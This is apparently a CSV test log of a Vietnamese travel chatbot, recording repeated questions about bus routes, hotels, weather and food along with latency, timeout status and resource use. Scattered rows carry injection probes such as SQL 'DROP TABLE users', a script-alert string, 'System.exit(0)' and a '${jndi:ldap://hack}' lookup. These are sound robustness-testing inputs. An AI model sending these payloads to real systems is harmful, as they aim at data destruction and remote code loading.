Timestamp,Question,Latency(s),Status,RAM(MB),CPU(%)
2026-01-14 08:28:40,Có xe limousine chạy tuyến TP.HCM - Buôn Ma Thuột không?,5.266,SUCCESS,11.13,36.6
2026-01-14 08:29:40,Tư vấn khách sạn gần Đại Nội Huế ở Đà Lạt.,7.277,SUCCESS,10.89,31.1
2026-01-14 08:30:40,Bot rác rưởi quá.,6.402,SUCCESS,10.57,25.9
2026-01-14 08:31:40,Bot cút đi quá.,7.055,SUCCESS,10.38,29.0
2026-01-14 08:32:40,Bot rác rưởi quá. [Ref:91847],7.576,SUCCESS,10.32,25.5
2026-01-14 08:33:40,Hướng dẫn bắt xe buýt từ Nhà thờ Đức Bà sang Khu du lịch Suối Tiên.,5.838,SUCCESS,10.44,32.3
2026-01-14 08:34:40,Tư vấn khách sạn gần Nhà tù Côn Đảo ở Nha Trang.,9.465,SUCCESS,10.39,21.6
2026-01-14 08:35:40,"Tôi muốn hỏi về lãi suất ngân hàng, tư vấn giúp tôi.",7.227,SUCCESS,10.39,35.1
2026-01-14 08:36:40,Lộ trình xe buýt đi từ Phố đi bộ Nguyễn Huệ về Giga Mall Thủ Đức như thế nào?,2.551,SUCCESS,10.39,21.9
2026-01-14 08:37:40,Tư vấn khách sạn gần Nhà tù Côn Đảo ở Nha Trang.,7.538,SUCCESS,10.46,24.0
2026-01-14 08:38:40,Làm sao đi từ TP.HCM ra Sapa bằng xe limousine?,4.403,SUCCESS,10.48,28.2
2026-01-14 08:39:40,Tư vấn khách sạn gần Tháp Bà Ponagar ở Sapa.,7.001,SUCCESS,10.53,28.9
2026-01-14 08:40:40,"Tôi muốn hỏi về lãi suất ngân hàng, tư vấn giúp tôi.",10.511,SUCCESS,10.33,31.5
2026-01-14 08:41:40,Mùa này đi Hội An thời tiết thế nào?,11.282,SUCCESS,10.42,26.5
2026-01-14 08:42:40,Cầu Vàng có gì đặc biệt về kiến trúc?,7.907,SUCCESS,10.54,33.3
2026-01-14 08:43:40,Từ Đại học Văn Lang đi Giga Mall Thủ Đức thì bắt xe số mấy?,2.061,SUCCESS,10.66,32.4
2026-01-14 08:44:40,Làm sao để đi xe buýt từ Bến Bạch Đằng đến Bến xe Miền Đông?,3.326,SUCCESS,10.62,26.3
2026-01-14 08:45:40,System.exit(0) -- [Ref:79020],18.848,SUCCESS,10.53,30.8
2026-01-14 08:46:40,Tư vấn khách sạn gần Chợ nổi Cái Răng ở Hà Giang.,6.139,SUCCESS,10.55,35.2
2026-01-14 08:47:40,Chỉ đường xe buýt từ Giga Mall Thủ Đức qua Khu công nghệ cao giúp tôi.,4.032,SUCCESS,10.59,32.3
2026-01-14 08:48:40,"Tôi muốn hỏi về cài Docker, tư vấn giúp tôi. [Ref:92809]",4.432,SUCCESS,10.68,31.6
2026-01-14 08:49:40,Lộ trình xe buýt đi từ Bến xe An Sương về Chợ Bến Thành như thế nào?,3.0,SUCCESS,10.36,21.5
2026-01-14 08:50:40,Chỉ đường xe buýt từ Đại học Văn Lang qua Bến xe An Sương giúp tôi.,3.019,SUCCESS,10.27,19.8
2026-01-14 08:51:40,Làm sao để đi xe buýt từ Sân bay Tân Sơn Nhất đến Đại học Văn Lang?,4.046,SUCCESS,10.2,19.9
2026-01-14 08:52:40,Mùa này đi Hà Nội thời tiết thế nào?,7.267,SUCCESS,10.53,28.8
2026-01-14 08:53:40,Lập lịch trình du lịch Sapa 3 ngày 2 đêm.,7.586,SUCCESS,10.37,22.6
2026-01-14 08:54:40,Tại sao  lại nổi tiếng?,7.285,SUCCESS,10.47,27.0
2026-01-14 08:55:40,Nguồn gốc của Nghệ thuật Bài Chòi bắt nguồn từ đâu?,8.51,SUCCESS,10.37,26.7
2026-01-14 08:56:40,"Tôi muốn hỏi về lỗi màn hình xanh, tư vấn giúp tôi. [Ref:82160]",7.805,SUCCESS,10.4,22.0
2026-01-14 08:57:40,Bot rác rưởi quá. [Ref:60416],6.842,SUCCESS,10.35,24.6
2026-01-14 08:58:40,"Tôi muốn hỏi về sốt xuất huyết, tư vấn giúp tôi.",9.887,SUCCESS,10.39,32.0
2026-01-14 08:59:40,Tư vấn khách sạn gần Chợ nổi Cái Răng ở Hà Giang.,8.912,SUCCESS,10.47,37.4
2026-01-14 09:00:40,Hướng dẫn bắt xe buýt từ Aeon Mall Tân Phú sang Dinh Độc Lập.,3.883,SUCCESS,10.57,38.3
2026-01-14 09:01:40,Top 5 địa điểm check-in đẹp nhất tại Nha Trang.,9.295,SUCCESS,10.63,38.0
2026-01-14 09:02:40,Mùa này đi Hội An thời tiết thế nào?,8.85,SUCCESS,10.7,39.0
2026-01-14 09:03:40,Giới thiệu cho tôi về Lễ hội Chùa Hương.,7.066,SUCCESS,10.51,28.5
2026-01-14 09:04:40,SELECT * FROM admin; --,6.713,SUCCESS,10.57,26.0
2026-01-14 09:05:40,Có tuyến xe buýt nào đi từ Giga Mall Thủ Đức tới Bến xe Miền Tây không?,3.433,SUCCESS,10.4,23.0
2026-01-14 09:06:40,<script>alert(1)</script> -- [Ref:69259],8.426,SUCCESS,10.03,16.4
2026-01-14 09:07:40,Lộ trình xe buýt đi từ Khu du lịch Suối Tiên về Aeon Mall Tân Phú như thế nào?,5.234,SUCCESS,10.04,12.8
2026-01-14 09:08:40,"Tôi muốn hỏi về fix lỗi Python, tư vấn giúp tôi.",6.428,SUCCESS,10.07,13.2
2026-01-14 09:09:40,"Tôi muốn hỏi về mua đất nền, tư vấn giúp tôi. [Ref:92353]",4.376,SUCCESS,10.11,13.6
2026-01-14 09:10:40,Tư vấn khách sạn gần Đại Nội Huế ở Đà Lạt.,7.364,SUCCESS,10.09,13.3
2026-01-14 09:11:40,Review món Bún chả và địa chỉ ăn ngon.,9.205,SUCCESS,10.06,13.3
2026-01-14 09:12:40,Tư vấn khách sạn gần Đỉnh Fansipan ở Huế.,9.025,SUCCESS,10.05,13.0
2026-01-14 09:13:40,Bot vô dụng quá.,8.222,SUCCESS,9.88,13.2
2026-01-14 09:14:40,Có tuyến xe buýt nào đi từ Giga Mall Thủ Đức tới Bến xe Miền Tây không?,2.462,SUCCESS,9.91,12.8
2026-01-14 09:15:40,Thánh địa Mỹ Sơn có gì đặc biệt về kiến trúc?,9.058,SUCCESS,9.9,13.2
2026-01-14 09:16:40,"Tôi muốn hỏi về cài Docker, tư vấn giúp tôi. [Ref:92809]",4.228,SUCCESS,9.88,13.0
2026-01-14 09:17:40,"Tôi muốn hỏi về cài Docker, tư vấn giúp tôi.",5.289,SUCCESS,9.89,12.7
2026-01-14 09:18:40,"Tôi muốn hỏi về mua đất nền, tư vấn giúp tôi. [Ref:92353]",4.29,SUCCESS,9.9,12.7
2026-01-14 09:19:40,Chỉ đường xe buýt từ Khu công nghệ cao qua Giga Mall Thủ Đức giúp tôi.,4.214,SUCCESS,9.88,13.4
2026-01-14 09:20:40,Vé xe khách từ TP.HCM đi Cần Thơ bao nhiêu tiền?,4.812,SUCCESS,9.92,13.2
2026-01-14 09:24:20,Top 5 địa điểm check-in đẹp nhất tại Hà Nội.,47.046,TIMEOUT,10.79,30.5
2026-01-14 09:25:20,Bot ngu dốt quá. [Ref:97234],47.062,TIMEOUT,10.37,53.6
2026-01-14 09:26:20,Tư vấn khách sạn gần Chùa Một Cột ở Nha Trang.,47.057,TIMEOUT,10.05,30.5
2026-01-14 09:27:20,Từ Đại học Văn Lang đi Giga Mall Thủ Đức thì bắt xe số mấy?,2.069,SUCCESS,10.09,26.0
2026-01-14 09:28:20,Mùa này đi Phú Quốc thời tiết thế nào?,47.066,TIMEOUT,10.04,24.4
2026-01-14 09:29:20,Tại sao Chùa Cầu lại nổi tiếng?,47.048,TIMEOUT,10.03,24.9
2026-01-14 09:30:20,System.exit(0) -- [Ref:16883],47.043,TIMEOUT,10.04,40.5
2026-01-14 09:31:20,Làm sao để đi xe buýt từ Công viên Đầm Sen đến Hồ Con Rùa?,2.559,SUCCESS,10.04,40.8
2026-01-14 09:32:20,Thánh địa Mỹ Sơn có gì đặc biệt về kiến trúc?,47.038,TIMEOUT,9.99,40.5
2026-01-14 09:33:20,Tư vấn khách sạn gần Đỉnh Fansipan ở Huế.,47.063,TIMEOUT,10.02,41.0
2026-01-14 09:34:20,Lộ trình xe buýt đi từ Bến Bạch Đằng về Công viên Đầm Sen như thế nào?,2.818,SUCCESS,10.03,41.1
2026-01-14 09:35:20,Tư vấn khách sạn gần Nhà tù Côn Đảo ở Nha Trang.,47.074,TIMEOUT,10.06,40.5
2026-01-14 09:36:20,Bot như hạch quá. [Ref:97905],47.056,TIMEOUT,10.32,31.7
2026-01-14 09:37:20,Mùa này đi Đà Lạt thời tiết thế nào?,47.052,TIMEOUT,10.49,13.1
2026-01-14 09:38:20,"Tôi muốn hỏi về giá vàng SJC, tư vấn giúp tôi.",47.089,TIMEOUT,10.42,15.9
2026-01-14 09:39:20,Tư vấn khách sạn gần Tháp Bà Ponagar ở Đà Nẵng.,47.055,TIMEOUT,10.34,14.3
2026-01-14 09:40:20,SELECT * FROM admin; --,47.054,TIMEOUT,10.26,15.3
2026-01-14 09:41:20,Review món Bún chả và địa chỉ ăn ngon.,47.054,TIMEOUT,10.46,14.1
2026-01-14 09:42:20,Bot rác rưởi quá. [Ref:21036],47.085,TIMEOUT,10.41,9.2
2026-01-14 09:43:20,Bot bị điên quá. [Ref:94698],47.067,TIMEOUT,10.37,9.1
2026-01-14 09:44:20,Lộ trình xe buýt đi từ Dinh Độc Lập về Sân bay Tân Sơn Nhất như thế nào?,47.109,TIMEOUT,10.43,10.2
2026-01-14 09:45:20,System.exit(0) -- [Ref:50974],47.06,TIMEOUT,10.47,9.7
2026-01-14 09:46:20,Lộ trình xe buýt đi từ Phố đi bộ Nguyễn Huệ về Giga Mall Thủ Đức như thế nào?,2.573,SUCCESS,10.1,9.2
2026-01-14 09:47:20,Tư vấn khách sạn gần Chợ nổi Cái Răng ở Hà Giang.,47.079,TIMEOUT,10.12,7.5
2026-01-14 09:48:20,"Tôi muốn hỏi về mua đất nền, tư vấn giúp tôi.",47.079,TIMEOUT,10.11,7.2
2026-01-14 09:49:20,Lập lịch trình du lịch Cần Thơ 3 ngày 2 đêm.,47.053,TIMEOUT,10.16,7.3
2026-01-14 09:50:20,${jndi:ldap://hack} --,47.062,TIMEOUT,10.15,7.2
2026-01-14 09:51:20,"Tôi muốn hỏi về mua đất nền, tư vấn giúp tôi.",47.075,TIMEOUT,10.1,7.0
2026-01-14 09:52:20,"Tôi muốn hỏi về cài Docker, tư vấn giúp tôi. [Ref:33155]",47.067,TIMEOUT,10.1,7.6
2026-01-14 09:53:20,Có tàu hỏa chạy tuyến TP.HCM - Đà Nẵng không?,47.059,TIMEOUT,10.08,6.8
2026-01-14 09:54:20,Bot vô dụng quá. [Ref:37393],47.075,TIMEOUT,10.11,6.9
2026-01-14 09:55:20,Tại sao Hoàng thành Thăng Long lại nổi tiếng?,47.064,TIMEOUT,10.11,7.4
2026-01-14 09:56:20,Review món Phở bò và địa chỉ ăn ngon.,47.069,TIMEOUT,10.1,7.1
2026-01-14 09:57:20,"Tôi muốn hỏi về cài Docker, tư vấn giúp tôi. [Ref:33155]",47.085,TIMEOUT,10.11,6.8
2026-01-14 09:58:20,Tại sao Dinh Bảo Đại lại nổi tiếng?,47.079,TIMEOUT,10.13,7.2
2026-01-14 09:59:20,Bot ngu dốt quá. [Ref:89522],47.083,TIMEOUT,10.14,7.0
2026-01-14 10:00:20,"Tôi muốn hỏi về sốt xuất huyết, tư vấn giúp tôi. [Ref:11514]",47.058,TIMEOUT,10.14,7.3
2026-01-14 10:01:20,"Tôi muốn hỏi về fix lỗi Python, tư vấn giúp tôi.",47.076,TIMEOUT,10.07,7.3
2026-01-14 10:02:20,Lộ trình xe buýt đi từ Dinh Độc Lập về Sân bay Tân Sơn Nhất như thế nào?,47.086,TIMEOUT,10.08,7.4
2026-01-14 10:03:20,Từ Khu công nghệ cao đi Dinh Độc Lập thì bắt xe số mấy?,2.08,SUCCESS,10.09,7.6
2026-01-14 10:04:20,Top 5 địa điểm check-in đẹp nhất tại Sapa.,47.065,TIMEOUT,10.09,7.3
2026-01-14 10:05:20,Lộ trình xe buýt đi từ Khu du lịch Suối Tiên về Aeon Mall Tân Phú như thế nào?,47.045,TIMEOUT,10.1,7.5
2026-01-14 10:06:20,"Tôi muốn hỏi về mua đất nền, tư vấn giúp tôi.",47.086,TIMEOUT,10.12,7.1
2026-01-14 10:07:20,Chỉ đường xe buýt từ Khu công nghệ cao qua Giga Mall Thủ Đức giúp tôi.,47.071,TIMEOUT,10.15,7.1
2026-01-14 10:08:20,Lộ trình xe buýt đi từ Bến xe An Sương về Chợ Bến Thành như thế nào?,47.053,TIMEOUT,10.13,7.6
2026-01-14 10:09:20,"Tôi muốn hỏi về bị đau bụng dưới, tư vấn giúp tôi. [Ref:27321]",47.08,TIMEOUT,10.07,7.7
2026-01-14 10:10:20,Làm sao để đi xe buýt từ Chợ Lớn đến Giga Mall Thủ Đức?,2.689,SUCCESS,10.12,7.8
2026-01-14 10:11:20,Có tuyến xe buýt nào đi từ Phố đi bộ Nguyễn Huệ tới Ngã 4 Thủ Đức không?,2.604,SUCCESS,10.12,7.5
2026-01-14 10:12:20,Review món Bún chả và địa chỉ ăn ngon.,47.085,TIMEOUT,10.15,7.8
2026-01-14 10:13:20,Bot bị điên quá. [Ref:90311],47.085,TIMEOUT,10.16,7.6
2026-01-14 10:14:20,Mùa này đi Cần Thơ thời tiết thế nào?,47.094,TIMEOUT,10.15,7.5
2026-01-14 10:15:20,"Tôi muốn hỏi về cài Docker, tư vấn giúp tôi. [Ref:84465]",47.109,TIMEOUT,10.17,7.4
2026-01-14 10:16:20,Tư vấn khách sạn gần Hoàng thành Thăng Long ở Đà Nẵng.,47.072,TIMEOUT,10.09,8.0
2026-01-14 10:17:20,Lộ trình xe buýt đi từ Bến Bạch Đằng về Khu du lịch Suối Tiên như thế nào?,47.083,TIMEOUT,10.1,7.4
2026-01-14 10:18:20,Làm sao để đi xe buýt từ Sân bay Tân Sơn Nhất đến Giga Mall Thủ Đức?,2.567,SUCCESS,10.08,7.1
2026-01-14 10:19:20,Lộ trình xe buýt đi từ Khu du lịch Suối Tiên về Aeon Mall Tân Phú như thế nào?,47.092,TIMEOUT,10.12,7.5
2026-01-14 10:20:20,Đến Cần Thơ thì nên đi ăn món gì ngon?,2.085,SUCCESS,10.12,7.0
2026-01-14 10:21:20,Cầu Vàng có gì đặc biệt về kiến trúc?,47.079,TIMEOUT,10.12,6.6
2026-01-14 10:22:20,Top 5 địa điểm check-in đẹp nhất tại Nha Trang.,47.101,TIMEOUT,10.11,7.5
2026-01-14 10:23:20,"Tôi muốn hỏi về ReactJS vs VueJS, tư vấn giúp tôi. [Ref:38137]",47.093,TIMEOUT,10.13,7.1
2026-01-14 10:24:20,Mùa này đi Hà Giang thời tiết thế nào?,47.08,TIMEOUT,10.15,7.3
2026-01-14 10:25:20,"Tôi muốn hỏi về ReactJS vs VueJS, tư vấn giúp tôi. [Ref:38137]",47.063,TIMEOUT,10.14,7.9
2026-01-14 10:26:20,Mùa này đi Phú Quốc thời tiết thế nào?,47.084,TIMEOUT,10.15,7.0
2026-01-14 10:27:20,Nguồn gốc của Dân ca Quan họ Bắc Ninh bắt nguồn từ đâu?,2.076,SUCCESS,10.15,7.2
2026-01-14 10:28:20,Làm sao để đi xe buýt từ Công viên Đầm Sen đến Chợ Bến Thành?,2.56,SUCCESS,10.18,7.6
2026-01-14 10:29:20,Bot vô dụng quá. [Ref:96890],47.1,TIMEOUT,10.15,7.6
2026-01-14 10:30:20,Có tuyến xe buýt nào đi từ Bến xe Miền Đông tới Công viên Đầm Sen không?,2.608,SUCCESS,10.18,7.3
2026-01-14 10:31:20,Bot bị điên quá.,47.074,TIMEOUT,10.13,7.2
2026-01-14 10:32:20,DROP TABLE users; -- [Ref:99903],47.08,TIMEOUT,10.12,7.2
2026-01-14 10:33:20,Tư vấn khách sạn gần Tháp Bà Ponagar ở Sapa.,47.071,TIMEOUT,10.16,7.1
2026-01-14 10:34:20,Bot bị điên quá. [Ref:94698],47.074,TIMEOUT,10.17,7.4
2026-01-14 10:35:20,Hướng dẫn bắt xe buýt từ Hồ Con Rùa sang Bến xe Miền Tây.,47.092,TIMEOUT,10.17,7.4
2026-01-14 10:36:20,Từ Giga Mall Thủ Đức đi Phố đi bộ Nguyễn Huệ thì bắt xe số mấy?,2.066,SUCCESS,10.18,6.8
2026-01-14 10:37:20,"Tôi muốn hỏi về đầu tư Bitcoin, tư vấn giúp tôi.",47.054,TIMEOUT,10.18,7.2
2026-01-14 10:38:20,Có tuyến xe buýt nào đi từ Bến xe Miền Đông tới Khu công nghệ cao không?,2.63,SUCCESS,10.2,6.8
2026-01-14 10:39:20,Từ Bến xe An Sương đi Khu du lịch Suối Tiên thì bắt xe số mấy?,47.067,TIMEOUT,10.21,7.5
2026-01-14 10:40:20,Mùa này đi Cần Thơ thời tiết thế nào?,47.082,TIMEOUT,10.23,7.5
2026-01-14 10:41:20,Giới thiệu cho tôi về Nhã nhạc cung đình Huế.,47.083,TIMEOUT,10.23,7.1
2026-01-14 10:42:20,Review món Phở bò và địa chỉ ăn ngon.,47.079,TIMEOUT,10.26,7.0
2026-01-14 10:43:20,Làm sao để đi xe buýt từ Công viên Đầm Sen đến Hồ Con Rùa?,2.526,SUCCESS,10.27,7.3
2026-01-14 10:44:20,Có xe limousine chạy tuyến TP.HCM - Buôn Ma Thuột không?,47.075,TIMEOUT,10.27,7.3
2026-01-14 10:45:20,Từ Đại học Bách Khoa đi Thảo Cầm Viên thì bắt xe số mấy?,2.062,SUCCESS,10.23,7.4
2026-01-14 10:46:20,Bot như hạch quá. [Ref:97905],47.062,TIMEOUT,10.2,7.5
2026-01-14 10:47:20,Đến Nha Trang thì nên đi ăn món gì ngon?,47.077,TIMEOUT,10.21,7.0
2026-01-14 10:48:20,Bot ngu dốt quá. [Ref:88819],47.059,TIMEOUT,10.22,6.9
2026-01-14 10:49:20,Hướng dẫn bắt xe buýt từ Aeon Mall Tân Phú sang Dinh Độc Lập.,2.567,SUCCESS,10.23,7.4
2026-01-14 10:50:20,Lộ trình xe buýt đi từ Khu du lịch Suối Tiên về Aeon Mall Tân Phú như thế nào?,47.064,TIMEOUT,10.22,7.0
2026-01-14 10:51:20,Mùa này đi Hội An thời tiết thế nào?,47.099,TIMEOUT,10.24,7.3
2026-01-14 10:52:20,Có tuyến xe buýt nào đi từ Bến xe Miền Đông tới Khu công nghệ cao không?,2.566,SUCCESS,10.26,6.8
2026-01-14 10:53:20,Tư vấn khách sạn gần Tháp Bà Ponagar ở Sapa.,47.081,TIMEOUT,10.22,7.5
2026-01-14 10:54:20,Thánh địa Mỹ Sơn có gì đặc biệt về kiến trúc?,47.085,TIMEOUT,10.22,6.9
2026-01-14 10:55:20,Lộ trình xe buýt đi từ Nhà thờ Đức Bà về Khu công nghệ cao như thế nào?,2.622,SUCCESS,10.23,7.4
2026-01-14 10:56:20,"Tôi muốn hỏi về sốt xuất huyết, tư vấn giúp tôi. [Ref:11514]",47.072,TIMEOUT,10.22,7.4
2026-01-14 10:57:20,Có tàu hỏa chạy tuyến TP.HCM - Đà Nẵng không?,47.074,TIMEOUT,10.23,7.3
2026-01-14 10:58:20,Hướng dẫn bắt xe buýt từ Đại học Văn Lang sang Công viên Đầm Sen.,2.586,SUCCESS,10.25,7.1
2026-01-14 10:59:20,Tư vấn khách sạn gần Chùa Một Cột ở Nha Trang.,47.102,TIMEOUT,10.25,7.9
2026-01-14 11:00:20,Lập lịch trình du lịch Cần Thơ 3 ngày 2 đêm.,47.059,TIMEOUT,10.3,7.9
2026-01-14 11:01:20,"Tôi muốn hỏi về sốt xuất huyết, tư vấn giúp tôi. [Ref:11514]",47.078,TIMEOUT,10.21,7.2
2026-01-14 11:02:20,Có xe limousine chạy tuyến TP.HCM - Buôn Ma Thuột không?,47.079,TIMEOUT,10.22,7.5
2026-01-14 11:03:20,Từ Thảo Cầm Viên đi Chợ Bến Thành thì bắt xe số mấy?,2.06,SUCCESS,10.26,7.2
2026-01-14 11:04:20,System.exit(0) -- [Ref:50974],47.087,TIMEOUT,10.25,7.1
2026-01-14 11:05:20,"Tôi muốn hỏi về lỗi màn hình xanh, tư vấn giúp tôi. [Ref:82160]",47.069,TIMEOUT,10.27,7.6
2026-01-14 11:06:20,"Tôi muốn hỏi về gãy xương, tư vấn giúp tôi.",47.09,TIMEOUT,10.28,6.9
2026-01-14 11:07:20,Bot ngu dốt quá. [Ref:94660],47.083,TIMEOUT,10.32,7.6
2026-01-14 11:08:20,Ý nghĩa lịch sử của  là gì?,47.091,TIMEOUT,10.32,7.1
2026-01-14 11:09:20,System.exit(0) -- [Ref:78828],47.057,TIMEOUT,10.37,7.1
2026-01-14 11:10:20,Làm sao để đi xe buýt từ Bến Bạch Đằng đến Bến xe Miền Đông?,2.575,SUCCESS,10.4,7.6
2026-01-14 11:11:20,SELECT * FROM admin; --,47.068,TIMEOUT,10.4,7.5
2026-01-14 11:12:20,"Tôi muốn hỏi về lãi suất ngân hàng, tư vấn giúp tôi. [Ref:95508]",47.084,TIMEOUT,10.36,7.0
2026-01-14 11:13:20,Có tàu cao tốc chạy tuyến TP.HCM - Huế không?,47.108,TIMEOUT,10.44,7.2
2026-01-14 11:14:21,Bot rác rưởi quá. [Ref:21036],47.081,TIMEOUT,10.38,8.1
2026-01-14 11:15:21,Lộ trình xe buýt đi từ Bến xe An Sương về Chợ Bến Thành như thế nào?,47.066,TIMEOUT,10.38,7.2
2026-01-14 11:16:21,Mùa này đi Hội An thời tiết thế nào?,47.077,TIMEOUT,10.31,8.5
2026-01-14 11:17:21,Tư vấn khách sạn gần Hoàng thành Thăng Long ở Đà Nẵng.,47.098,TIMEOUT,10.33,7.6
2026-01-14 11:18:21,"Tôi muốn hỏi về cài Docker, tư vấn giúp tôi.",47.071,TIMEOUT,10.35,8.0
2026-01-14 11:19:21,Có tàu cao tốc chạy tuyến TP.HCM - Huế không?,47.079,TIMEOUT,10.39,8.3
2026-01-14 11:20:21,Bot rác rưởi quá.,47.073,TIMEOUT,10.4,7.2
2026-01-14 11:21:21,Chỉ đường xe buýt từ Đại học Văn Lang qua Bến xe An Sương giúp tôi.,47.08,TIMEOUT,10.4,7.0
2026-01-14 11:22:21,Tư vấn khách sạn gần Tháp Bà Ponagar ở Sapa.,47.065,TIMEOUT,10.42,7.2
2026-01-14 11:23:21,Đến Buôn Ma Thuột thì nên đi ăn món gì ngon?,2.094,SUCCESS,10.37,6.8
2026-01-14 11:24:21,Bot vô dụng quá. [Ref:96890],47.072,TIMEOUT,10.36,7.5
2026-01-14 11:25:21,Review món Bánh xèo miền Tây và địa chỉ ăn ngon.,47.085,TIMEOUT,10.41,7.6
2026-01-14 11:26:21,${jndi:ldap://hack} --,47.067,TIMEOUT,10.38,7.3
2026-01-14 11:27:21,DROP TABLE users; -- [Ref:99903],47.083,TIMEOUT,10.39,6.9
2026-01-14 11:28:21,Mùa này đi Đà Lạt thời tiết thế nào?,47.077,TIMEOUT,10.43,7.5
2026-01-14 11:29:21,SELECT * FROM admin; --,47.097,TIMEOUT,10.39,7.8
2026-01-14 11:30:21,Làm sao đi từ TP.HCM ra Cần Thơ bằng tàu cao tốc?,47.084,TIMEOUT,10.4,7.3
2026-01-14 11:31:21,Bot bị điên quá. [Ref:90311],47.054,TIMEOUT,10.33,7.2
2026-01-14 11:32:21,Làm sao để đi xe buýt từ Chợ Lớn đến Giga Mall Thủ Đức?,47.057,TIMEOUT,10.38,7.9
2026-01-14 11:33:21,Mùa này đi Nha Trang thời tiết thế nào?,47.073,TIMEOUT,10.38,7.0
2026-01-14 11:34:21,Có tuyến xe buýt nào đi từ Bến xe Miền Tây tới Nhà thờ Đức Bà không?,2.631,SUCCESS,10.4,7.0
2026-01-14 11:35:21,Lập lịch trình du lịch Đà Nẵng 3 ngày 2 đêm.,47.069,TIMEOUT,10.39,7.3
2026-01-14 11:36:21,Đến Cần Thơ thì nên đi ăn món gì ngon?,2.065,SUCCESS,10.39,6.8
2026-01-14 11:37:21,Từ Đại học Văn Lang đi Giga Mall Thủ Đức thì bắt xe số mấy?,2.078,SUCCESS,10.43,7.3
2026-01-14 11:38:21,"Tôi muốn hỏi về gãy xương, tư vấn giúp tôi.",47.073,TIMEOUT,10.43,7.3
2026-01-14 11:39:21,"Tôi muốn hỏi về cài Docker, tư vấn giúp tôi. [Ref:84465]",47.066,TIMEOUT,10.45,7.3
2026-01-14 11:40:21,Đến Phú Quốc thì nên đi ăn món gì ngon?,47.061,TIMEOUT,10.46,7.1
2026-01-14 11:41:21,${jndi:ldap://hack} -- [Ref:93201],47.094,TIMEOUT,10.46,7.4
2026-01-14 11:42:21,Bot rác rưởi quá. [Ref:21036],47.083,TIMEOUT,10.46,7.0
2026-01-14 11:43:21,Bot rác rưởi quá. [Ref:74147],47.076,TIMEOUT,10.51,7.4
2026-01-14 11:44:21,Review món Phở bò và địa chỉ ăn ngon.,47.068,TIMEOUT,10.51,7.3
2026-01-14 11:45:21,Tư vấn khách sạn gần Chùa Một Cột ở Nha Trang.,47.044,TIMEOUT,10.5,7.4
2026-01-14 11:46:21,Bot rác rưởi quá. [Ref:60416],47.083,TIMEOUT,10.43,7.3
2026-01-14 11:47:21,Top 5 địa điểm check-in đẹp nhất tại Buôn Ma Thuột.,47.076,TIMEOUT,10.45,7.2
2026-01-14 11:48:21,"Tôi muốn hỏi về sốt xuất huyết, tư vấn giúp tôi. [Ref:90815]",47.08,TIMEOUT,10.48,7.0
2026-01-14 11:49:21,Bot vô dụng quá. [Ref:96890],47.08,TIMEOUT,10.49,7.5
2026-01-14 11:50:21,Tại sao Chùa Cầu lại nổi tiếng?,47.066,TIMEOUT,10.48,7.8
2026-01-14 11:51:21,Bot ngu dốt quá. [Ref:89522],47.067,TIMEOUT,10.51,7.3
2026-01-14 11:52:21,Có tuyến xe buýt nào đi từ Aeon Mall Tân Phú tới Đại học Bách Khoa không?,47.079,TIMEOUT,10.51,6.9
2026-01-14 11:53:21,Nguồn gốc của  bắt nguồn từ đâu?,47.082,TIMEOUT,10.52,7.3
2026-01-14 11:54:21,"Tôi muốn hỏi về sốt xuất huyết, tư vấn giúp tôi. [Ref:11514]",47.079,TIMEOUT,10.53,7.6
2026-01-14 11:55:21,Từ Đại học Bách Khoa đi Thảo Cầm Viên thì bắt xe số mấy?,2.075,SUCCESS,10.53,7.6
2026-01-14 11:56:21,Có tuyến xe buýt nào đi từ Công viên Đầm Sen tới Aeon Mall Tân Phú không?,47.078,TIMEOUT,10.49,7.6
2026-01-14 11:57:21,Làm sao để đi xe buýt từ Sân bay Tân Sơn Nhất đến Giga Mall Thủ Đức?,2.194,SUCCESS,10.51,7.0
2026-01-14 11:58:21,Bot ngu dốt quá. [Ref:94660],47.097,TIMEOUT,10.51,7.1
2026-01-14 11:59:21,Bot ngu dốt quá.,47.063,TIMEOUT,10.53,6.9
2026-01-14 12:00:21,Vé xe khách từ TP.HCM đi Cần Thơ bao nhiêu tiền?,47.056,TIMEOUT,10.53,7.2
2026-01-14 12:01:21,Lộ trình xe buýt đi từ Thảo Cầm Viên về Nhà thờ Đức Bà như thế nào?,47.056,TIMEOUT,10.46,7.7
2026-01-14 12:02:21,Bot ngu dốt quá.,47.045,TIMEOUT,10.48,7.1
2026-01-14 12:03:21,"Tôi muốn hỏi về lỗi màn hình xanh, tư vấn giúp tôi. [Ref:82160]",47.08,TIMEOUT,10.47,7.4
2026-01-14 12:04:21,Tư vấn khách sạn gần Chợ nổi Cái Răng ở Hà Giang.,47.067,TIMEOUT,10.49,7.2
